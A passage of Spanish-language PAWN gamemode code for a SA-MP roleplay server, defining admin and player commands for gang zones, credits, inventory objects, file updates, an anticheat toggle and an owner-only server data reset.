			    InfoCasa[i][cEntrada_x] = 140.1829;
			    InfoCasa[i][cEntrada_y] = 1396.6548;
			    ActualizarCasa(i);
			}
			if(InfoCasa[i][cEntrada_x] == 250.430465)//17
			{
			    InfoCasa[i][cEntrada_x] = 250.4457;
			    InfoCasa[i][cEntrada_y] = 995.3734;
			    ActualizarCasa(i);
			}
		}
		return 1;
	}

	CMD:creditos(playerid,params[])
	{
	    new
			Str[250];

	    strcat(Str,"• Ryan Spell (Fundador, desarrollador, único scripter)\n");
	    strcat(Str,"• Facundo Koyro (Fundador, Mapper)\n");
	    strcat(Str,"• Facundo Sanchi (Tester, publicista, ideas)\n");
	    strcat(Str,"• Nathan Johnson y Facu Koyro (Mapper)\n");
	    strcat(Str,"• Rulz (Alojamiento, publicista)\n");
	    strcat(Str,"\n");

		Dialog(playerid,dError,DIALOG_STYLE_MSGBOX,"Créditos de Optimus RolePlay",Str,"Cerrar","");
		return 1;
	}


	CMD:creargangzone(playerid, params[])
	{
	    if(Staff(playerid,SubDueno)) return 1;
	    Para_Admin_Servicio

	    new
	        i = -1,
			Familia = -1;

		Loop(i_0, MAX_GZS, 0)
		{
		    if(!IsValidGangZone(i_0))
			{
				i = i_0;
				break;
			}
		}

		if(i == -1) return Error(playerid,"No hay más memoria para crear GZ.");
	    if(sscanf(params,"D(-1)", Familia)) return ParamsINC(playerid,"/creargangzone [Opcional: ID pandilla]");

		new
		    Index = -1, Float: x, Float: y, Float: z;

		GetPlayerPos(playerid, x, y, z);

	 	for (new a = 0; a != sizeof (ZoneNames); ++a)
	 	{
			if (x >= ZoneNames[a][zoneArea][0] && x <= ZoneNames[a][zoneArea][3] && y >= ZoneNames[a][zoneArea][1] && y <= ZoneNames[a][zoneArea][4])
			{
				Index = a;
				break;
			}
		}
		if(Index == -1) return Error(playerid, "No se encontró una zona en tu cordenada.");
		if(Familia != -1 && InfoFamilia[Familia][fPandilla] == false) return Error(playerid, "¡Solo puedes crear ~g~GangZones ~w~para pas pandillas!");
		if(Familia == -1)
		{
			Familia = 0;
		}
		CrearGangZone(i, ZoneNames[Index][zoneArea][0], ZoneNames[Index][zoneArea][1], ZoneNames[Index][zoneArea][3], ZoneNames[Index][zoneArea][4], Familia);
		InfoGZ[i][gzMin][0] = ZoneNames[Index][zoneArea][0];
		InfoGZ[i][gzMin][1] = ZoneNames[Index][zoneArea][1];

		InfoGZ[i][gzMax][0] = ZoneNames[Index][zoneArea][3];
		InfoGZ[i][gzMax][1] = ZoneNames[Index][zoneArea][4];

		InfoGZ[i][gzPandilla] = Familia;

		Mensaje(playerid, -1, "* ¡GangZone Creada!");
		ActualizarGangZones();
		return 1;
	}

	CMD:creargangzone_2(playerid, params[])
	{
	    if(Staff(playerid,SubDueno)) return 1;
	    Para_Admin_Servicio

	    new
	        i = -1;

		Loop(i_0, MAX_GZS, 0)
		{
		    if(!IsValidGangZone(i_0))
			{
				i = i_0;
				break;
			}
		}

		if(i == -1) return Error(playerid,"No hay más memoria para crear GZ.");
	    if(sscanf(params,"p<|>ffffD(0)", InfoGZ[i][gzMin][0], InfoGZ[i][gzMin][1], InfoGZ[i][gzMax][0], InfoGZ[i][gzMax][1], InfoGZ[i][gzPandilla])) return ParamsINC(playerid,"/creargangzone_2 [ Minx | Miny | Maxx | Maxy | ID-Pandilla ]");



		CrearGangZone(i, InfoGZ[i][gzMin][0], InfoGZ[i][gzMin][1], InfoGZ[i][gzMax][0], InfoGZ[i][gzMax][1], InfoGZ[i][gzPandilla]);
		Mensaje(playerid,-1,"> ¡GangZone Creada!");
		ActualizarGangZones();
		return 1;
	}

	CMD:borrargangzone(playerid, params[])
	{
	    Para_Admin_Servicio

	    if(Staff(playerid,SubDueno)) return 1;
	    if(sscanf(params,"i", params[0])) return ParamsINC(playerid, "/borrargangzone [ID]");
		if(!IsValidGangZone(params[0])) return Error(playerid,"ID de Gangzone inválido.");

		Bit_Set(ValidGZ, params[0], false);

		gzTiempo[params[0]] = 0;
		gzAtacadaPor[params[0]] = -1;

		GangZoneDestroy(InfoGZ[params[0]][gzID]);

		for(new i; E_GZ:i < E_GZ; E_GZ:i++)
		{
		    InfoGZ[params[0]][E_GZ:i] = 0;
		}

		ActualizarGangZones();
		Mensaje(playerid,-1, "GangZone eliminada.");

		return 1;
	}

	CMD:conquistar(playerid,params[])
	{
	    if(!InfoFamilia[ID_Familia(playerid)][fPandilla]) return Error(playerid,"¡No perteneces a una pandilla!");
		new GZ = GetPlayerGangZone(playerid);

		if(GZ == -1) return Error(playerid, "¡No estas en una zona conquistable!");
		if(InfoGZ[GZ][gzPandilla]) return Error(playerid,"Para conquistar una zona con pandilla, debes generar una guerra ahi.");
		if(gzAtacadaPor[GZ] != -1) return Error(playerid,"¡Ya hay una guerra de bandas aca!");
		if(PandillerosEnGangZone(ID_Familia(playerid), GZ) < MIN_ATACANTES_GZ) return Error(playerid,"Deben haber "#MIN_ATACANTES_GZ"atacantes en la zona, minimo");

		gzAtacadaPor[GZ] = ID_Familia(playerid);
		gzTiempo[GZ] = 0;
		GangZoneFlashForAll(InfoGZ[GZ][gzID], C_GZ_EN_GUERRA );

		new
			MapIconID,
			Float:Poss[3];

		GetPlayerPos(playerid, Poss[0], Poss[1], Poss[2]);

		switch(ID_Familia(playerid))
		{
		    case 1: //Grooves
		    {
		        MapIconID = 62;
			}
			case 2: //Ballas
			{
		        MapIconID = 59;
			}
			case 3: //Sureños
			{
		        MapIconID = 58;
			}
			default: MapIconID = 58;
		}
		foreach(Player, i)
		{
		    if(ID_Familia(i) && InfoFamilia[ID_Familia(i)][fPandilla])
		    {
		        MensajeF(i,-1, "¡Los %s quieren conquistar una zona! "#CROJO"Se marcó su posición con el icono", InfoFamilia[ID_Familia(playerid)][fNombre] );
		        SetPlayerMapIcon(i, MI_GANGWARS, Poss[0], Poss[1], 5.0, MapIconID, -1, MAPICON_GLOBAL);
			}
		}


		return 1;
	}

	CMD:actualizararchivos(playerid,params[])
	{
	    if(!EsDueno(playerid)) return Error(playerid,"¡Comando autorizado solo para dueños!");
		//Casas
		new TickC = GetTickCount();
		foreach(Casas,i)
		{
			ActualizarCasa(i);
		}//garages
		foreach(Garages,i)
		{
			ActualizarGarage(i);
		}//negocios
		foreach(Negocios,i)
		{
			ActualizarNegocio(i);
		}//usuarios
		foreach(Player,i)
		{
			ActualizarCuenta(i);
			ActualizarAccesorios(playerid, -1);
		}//vehiculos
		foreach(VehVenta,i)
		{
			ActualizarVehiculo(i);
		}
		TextoTodos("~p~ACTUALIZADO: ~w~Archivos de configuracion",6000,3);
		printf(" - Todos los archivos de configuración actualizados. [%s | TIEMPO: %d MS]",pName(playerid),GetTickCount() - TickC);
		MensajeF(playerid,-1," - Todos los archivos de configuración actualizados. [%s | TIEMPO: %d MS]",pName(playerid),GetTickCount() - TickC);
		return 1;
	}

	CMD:idgz(playerid,params[])
	{
		if(GetPlayerGangZone(playerid) == -1) return Error(playerid,"No se encontro ninguna GangZone en tu posición.");
		return MensajeF(playerid,-1,"El ID de esta GangZone, es: "#CVERDE"%d", GetPlayerGangZone(playerid) );
	}

stock encode_tires(tire1, tire2, tire3, tire4)
{
	return tire1 | (tire2 << 1) | (tire3 << 2) | (tire4 << 3);
}

stock encode_panels(flp, frp, rlp, rrp, windshield, front_bumper, rear_bumper)
{
    return flp | (frp << 4) | (rlp << 8) | (rrp << 12) | (windshield << 16) | (front_bumper << 20) | (rear_bumper << 24);
}
stock encode_doors(bonnet, boot, driver_door, passenger_door, behind_driver_door, behind_passenger_door)
{
    #pragma unused behind_driver_door
    #pragma unused behind_passenger_door
    return bonnet | (boot << 8) | (driver_door << 16) | (passenger_door << 24);
}
stock encode_lights(light1, light2, light3, light4)
{
    return light1 | (light2 << 1) | (light3 << 2) | (light4 << 3);
}

CALLBACK: GetPlayerAdminLevelOP(playerid)
	return InfoJugador[playerid][jAdmin];

	CMD:NOP_ResetPlayerWeapons(playerid, params[])
	{
		if(IsPlayerAdmin(playerid))
		{
		    if(NOP_ResetPlayerWeapons)
		    {
		    	NOP_ResetPlayerWeapons = false;
		    	SendClientMessage(playerid, 0xFF000000, "[ANTICHEAT] {FFFFFF}NOP_ResetPlayerWeapons: {FF0000}[DISABLED]");
			}
			else
			{
		    	NOP_ResetPlayerWeapons = false;
		    	SendClientMessage(playerid, 0xFF000000, "[ANTICHEAT] {FFFFFF}NOP_ResetPlayerWeapons: {FFFF00}[ENABLED]");
			}
			return 1;
		}
		return 0;
	}

	CMD:resetserver(playerid, params[])
	{
	    if(strcmp(pName(playerid), "Ryan_Spell", true)) return Error(playerid, "CMD autorizado solo para Ryan.");
		new str[30];

		static paso;
		if(paso == 0)
		{
			Dialog(playerid, dError, DIALOG_STYLE_MSGBOX, "Resetear servidor", ""#CROJO"ATENCIÓN: "#CBLANCO"Este comando va a borrar TODOS los DATOS!\n\nEscribi el CMD otra vez si estás seguro", "Cerrar", "");
            paso = 1;
			return 1;
		}
		if(paso == 1)
		{
			Dialog(playerid, dError, DIALOG_STYLE_MSGBOX, "Resetear servidor", ""#CROJO"ATENCIÓN: "#CBLANCO"SEGURISIMO? ESTA ACCION ES IRREVERSIBLE!!!", "Cerrar", "");
            paso = 2;
			return 1;
		}

		fremove("Datos_generales.ini");
		MensajeF(playerid, C_ROJO, "DATOS GENERALES ELIMINADOS");

		new count = 0;

		//BANCO-----------------------------------------------------------------
		Loop(i, MAX_CUENTAS_BANCARIAS, 0)
		{
		    A_Format(str, "Banco/%d.ini", i);
		    if(fexist(str))
		    {
		        fremove(str);
		        count++;
		        MensajeF(playerid, -1, "REMOVED: %s", str);
			}
		}
		MensajeF(playerid, C_ROJO, "CUENTAS BANCARIAS ELIMINADAS: %d", count);
		count = 0;

		//VEHICULOS-------------------------------------------------------------
		foreach(VehVenta, i)
		{
			Loop(a, MAX_ARMAS_VEH, 0)
			{
			    if(InfoVeh[i][vArma][a])
			    {
			        InfoVeh[i][vArma][a] = 0;
			        InfoVeh[i][vBalas][a] = 0;
					ActualizarVehiculo(i);
				}
			}
			Loop(a, MAX_VEH_MODS, 0)
			{
				if(vMods[i][a])
				{
                    vMods[i][a] = 0;
					ActualizarVehiculo(i);
				}
			}
			if(InfoVeh[i][vPrecio] != PrecioVeh(InfoVeh[i][vModelo]))
			{
			    InfoVeh[i][vPrecio] = PrecioVeh(InfoVeh[i][vModelo]);
				ActualizarVehiculo(i);
			}

		    if(strfind(InfoVeh[i][vComprador], "_") == -1) continue;

		    A_Format(str, "Vehiculos/%d.ini", i);
		    if(fexist(str))
		    {
		        fremove(str);
		        MensajeF(playerid, -1, "REMOVED: %s", str);
			}
		}
		MensajeF(playerid, C_ROJO, "VEHICULOS COMPRADOS ELIMINADOS: %d", count);
		count = 0;

		//CASAS-----------------------------------------------------------------
		foreach(Casas, i)
		{
			new CArch[20];
		 	format(CArch,sizeof(CArch),"Casas/%d.ini",i);

			new INI:Arch = INI_Open(CArch);

			INI_SetTag(Arch,"data");

			alm(InfoCasa[i][cNombre], "");
			alm(InfoCasa[i][cComprador], "");
			InfoCasa[i][cDinero] = 0;
			InfoCasa[i][cContra] = 0;
			InfoCasa[i][cContra_puerta] = 0;
			InfoCasa[i][cCerrada] = false;
			InfoCasa[i][cComprada] = false;

			INI_WriteString(Arch,"Nombre",InfoCasa[i][cNombre]);
			INI_WriteString(Arch,"Dueño",InfoCasa[i][cComprador]);
			INI_WriteInt(Arch,"Contraseña",InfoCasa[i][cContra]);

			INI_WriteInt(Arch,"Dinero",InfoCasa[i][cDinero]);
			INI_WriteInt(Arch,"Precio",InfoCasa[i][cPrecio]);
			INI_WriteInt(Arch,"VirtualWorld",InfoCasa[i][cVW]);
			INI_WriteInt(Arch,"Interior",InfoCasa[i][cInt]);

			INI_WriteBool(Arch,"Comprada",InfoCasa[i][cComprada]);
			INI_WriteBool(Arch,"Cerrada",InfoCasa[i][cCerrada]);

			INI_WriteInt(Arch,"Contraseña_puerta", InfoCasa[i][cContra_puerta]);

			Loop(a,10,0)
			{
			    A_Format(str,"Arma_%d",a);
			    INI_RemoveEntry(Arch, str);
			}
			Loop(a,10,0)
			{
			    A_Format(str,"Bala_%d",a);
			    INI_RemoveEntry(Arch, str);
			}
			Loop(a, MAX_MUEBLES_CASA, 0)
			{
			    A_Format(str, "ObjData_%d", a);
			    INI_RemoveEntry(Arch, str);
			}
			INI_Close(Arch);
		}
		MensajeF(playerid, C_ROJO, "CASAS RESETEADAS.", count);
		count = 0;
		//NEGOCIOS--------------------------------------------------------------
		foreach(Negocios, i)
		{
			InfoNegocio[i][nDinero] = 0;
			InfoNegocio[i][nContra] = 0;
			alm(InfoNegocio[i][nComprador], "");
			InfoNegocio[i][nPrecioEntrada] = 0;
			ActualizarNegocio(i);
		}
		MensajeF(playerid, C_ROJO, "NEGOCIOS RESETEADOS.", count);
		count = 0;
		//FACCIONES--------------------------------------------------------------
		Loop(i, MAX_FACCIONES, 0)
		{
		    InfoFaccion[i][fDinero] = 0;
		}
		ActualizarFacciones();
		MensajeF(playerid, C_ROJO, "FACCIONES RESETEADAS (DINERO)", count);
		fremove("Facciones/Hitman/Contratos.ini");
		MensajeF(playerid, C_ROJO, "ELIMINADOS: CONTRATOS DE HITMAN", count);
		return 1;
	}


	CMD:darobjeto(playerid, params[])
	{
		if(Staff(playerid,Dueno)) return 1;
		if(sscanf(params, "ui", params[0], params[1])) return ParamsINC(playerid, "/darobjeto [Nombre/ID] [ID]");
		if(!IsValidObject2(params[1])) return Error(playerid, "ID de objeto inválido.");
		if(HaveObject(params[0], params[1])) return Error(playerid, "¡Ese jugador ya tiene ese objeto!");
		if(!AddToInv(params[0], params[1])) return Error(playerid, "¡Esa persona no tiene más espacio en su inventario!");
		return 1;
	}

	CMD:verobjetos(playerid, params[])
	{
		if(Staff(playerid,Dueno)) return 1;

		new
		    Name[30];

		Mensaje(playerid, 1, "==============================================");
		for(new i; i < sizeof (ObjectInfo); i++)
		{
		    GetObjectName(ObjectInfo[i][objModel], Name, 30);
			MensajeF(playerid, -1, "Nombre: %s | ID: %d", Name, ObjectInfo[i][objModel]);
		}
		Mensaje(playerid, 1, "==============================================");
		return 1;
	}

	AbreviarCMD(celular,cel);
	AbreviarCMD(reportar,re);
	AbreviarCMD(fac,f);
	AbreviarCMD(megafono,m);